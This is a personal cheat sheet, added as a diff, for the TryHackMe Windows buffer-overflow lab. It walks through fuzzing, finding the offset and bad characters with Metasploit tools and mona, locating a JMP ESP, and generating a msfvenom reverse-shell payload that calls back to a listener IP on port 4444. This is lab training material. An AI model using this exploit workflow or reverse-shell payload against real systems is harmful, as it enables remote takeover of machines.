@@ -1,0 +1,66 @@
+### windows binary exploitation ###
+## links ##
+https://tryhackme.com/room/bufferoverflowprep
+
+
+################
+## Walktrough ##
+################
+## SETUP ##
+# Open Immunity Debugger as admin
+# file > open the binary.exe
+
+## Mona Configuration
+# !mona config -set workingfolder c:\mona\%p				# config workdir
+
+## Create fuzz.py and run it to fuzz very long string till crach
+cp /home/tristan/perso/secu/pwn/win/fuzz.py .
+
+
+## FUZZ! ##
+python fuzz.py								# check when it crash, ex: 2000 bytes
+/opt/metasploit/tools/exploit/pattern_create.rb -l 2400			# create pattern a bit longer
+# create exploit.py file and set payload=created_pattern then restart and retry
+cp /home/tristan/perso/secu/pwn/win/exploit.py .
+
+# Immunity debugger should crash and display an access violation like [41414141]
+/opt/metasploit/tools/exploit/pattern_offset.rb -q 6f43396e		# calculate offset
+	[*] Exact match at offset 1978					# offset is at 1978
+# OR
+!mona findmsp -distance 2400						# check EIP contains ... (offset XXXX)
+# Add offset conf to exploit.py
+# Add "BBBB" as retn to exploit.py
+
+
+## FIND BAD CHARS ##
+# bytearray.bin is located in the configured working folder
+!mona bytearray -b "\x00"						# gen bytearray, exclude \x00
+cp /home/tristan/perso/secu/pwn/win/bad.py .				# copy badchar gen python script
+python bad.py								# gen bad chars with the python script
+									# put it in payload var
+python exploit.py
+# Make a note of the address to which the ESP register points and use it in the following mona command
+!mona compare -f C:\mona\oscp\bytearray.bin -a <address>		# replace with ESP register addr
+!mona compare -f C:\mona\oscp\bytearray.bin -a 019efa30			# example
+# remove badchar and retry till no diff appear
+
+
+## FIND JMP POINT ##
+# while binary running or crashed state
+!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"				# find ret without bad chars (log menu)
+# replace retn variable with ret found (backward)
+# OR !!! if ASLR is activated
+!mona modules								# try to find a module without ASLR
+!mona jmp -r esp -cpb "\x00" -m "essfunc.dll"				# find ret in specific module
+
+
+## GEN PAYLOAD ##
+# gen payload (x86 or x64)
+msfvenom -p windows/shell_reverse_tcp LHOST=10.14.32.190 LPORT=4444 EXITFUNC=thread -b "\x00\xXX..." -f c
+payload = ("\x....\x..")						# use generated payload
+padding = "\x90" * 16							# padding with NOP
+nc -lnvp 4444
+python exploit.py							# should return a shell
+
+
+
